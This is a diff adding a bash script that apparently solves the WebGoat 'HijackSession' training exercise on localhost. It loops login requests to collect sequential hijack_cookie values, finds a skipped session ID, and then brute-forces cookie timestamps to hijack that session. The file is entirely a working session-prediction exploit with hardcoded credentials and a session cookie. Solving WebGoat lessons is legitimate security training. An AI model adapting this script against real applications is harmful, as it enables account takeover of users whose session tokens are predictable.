@@ -1,0 +1,69 @@
+#!/bin/bash
+#
+# Based on the following code: https://pastebin.ubuntu.com/p/BzCjS3zrGD/.
+#
+# shellcheck disable=SC2034
+#
+########################################################################################
+
+
+username="admin"
+password="password123"
+JSESSIONID="k4r1-OQ8GYLzldH10p-42QaDt0Vo37atpiIPowFK"
+session_id=0
+session_start_time=0
+session_end_time=0
+current_session_id=0
+previous_session_id=0
+current_session_timestamp=0
+previous_session_timestamp=0
+
+echo "=========== Searching for session ==========="
+echo ""
+
+for request in {1..1000}; do
+    current_session="$(curl -i -s -X POST \
+        "http://localhost:8080/WebGoat/HijackSession/login/?username=$username&password=$password" \
+        -H "Cookie: JSESSIONID=$JSESSIONID;" \
+        | grep -Eo 'hijack_cookie=[0-9]*-[0-9]*' \
+        | cut -d '=' -f 2)"
+    # shellcheck disable=SC2086
+    current_session_id="$(echo $current_session | cut -d '-' -f 1)"
+    # shellcheck disable=SC2086
+    current_session_timestamp="$(echo $current_session | cut -d '-' -f 2)"
+
+    echo "$current_session_id - $current_session_timestamp"
+
+    if [[ -n $previous_session_id ]]; then
+        if [[ $((current_session_id - previous_session_id)) -eq 2 ]]; then
+            echo ""
+            echo "Session found: $((previous_session_id + 1))"
+            session_id=$((previous_session_id+1))
+            session_start_time=$previous_session_timestamp
+            session_end_time=$current_session_timestamp
+            break
+        fi
+    fi
+
+    previous_session_id=$current_session_id
+    previous_session_timestamp=$current_session_timestamp
+done
+
+echo ""
+echo "=========== Session ID Found ==========="
+echo ""
+echo "Session ID: $session_id"
+echo "Timestamps: From $session_start_time to $session_end_time"
+echo ""
+echo "=========== Checking session for $session_id in timestamp range ==========="
+echo ""
+
+for timestamp in $(seq -f %1.0f "$session_start_time" "$session_end_time") ; do
+    response=$(curl -i -s -X POST \
+        "http://localhost:8080/WebGoat/HijackSession/login/?username=$username&password=$password" \
+        -H "Cookie: JSESSIONID=$JSESSIONID; hijack_cookie=$session_id-$timestamp; secure;" \
+        | grep 'feedback' | cut -d ":" -f 2)
+
+    echo "$session_id - $timestamp: $response"
+done
+
